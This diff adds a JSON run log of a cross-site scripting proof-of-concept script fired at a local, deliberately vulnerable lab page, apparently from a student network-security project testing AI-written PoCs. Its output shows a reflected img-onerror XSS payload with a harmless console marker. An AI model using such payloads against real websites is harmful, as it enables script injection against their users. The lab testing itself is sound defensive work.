@@ -1,0 +1,28 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v2\\XSS-003__1.py",
+    "--base",
+    "http://127.0.0.1:9080",
+    "--path",
+    "/vulnerabilities/xss_r/",
+    "--cookie",
+    "PHPSESSID=<redacted>; security=<level>"
+  ],
+  "started_at": "2026-10-20T14:43:25+08:00",
+  "returncode": 0,
+  "elapsed_seconds": 0.168,
+  "stdout": "status: 200\r\ncontent-type: text/html;charset=utf-8\r\nmarker reflected at offset 3252\r\nname?\r\r\n\t\t\t\t<input type=\"text\" name=\"name\">\r\r\n\t\t\t\t<input type=\"submit\" value=\"Submit\">\r\r\n\t\t\t</p>\r\n\r\r\n\t\t</form>\r\r\n\t\t<pre>Hello <img src=x onerror=\"console.log('LLM_LAB_XSS')\"></pre>\r\r\n\t</div>\r\r\n\r\r\n\t<h2>More Information</h2>\r\r\n\t<ul>\r\r\n\t\t<li><a href=\"https://owasp.org/www-community/attacks/xss/\" targe\r\nNOTE: reflection shown in HTTP only; browser execution needs manual observation.\r\n",
+  "stderr": "",
+  "cohort": "v2",
+  "stem": "XSS-003__1",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v2\\XSS-003__1.py",
+  "args_redacted": [
+    "--base",
+    "http://127.0.0.1:9080",
+    "--path",
+    "/vulnerabilities/xss_r/",
+    "--cookie",
+    "PHPSESSID=<redacted>; security=<level>"
+  ]
+}
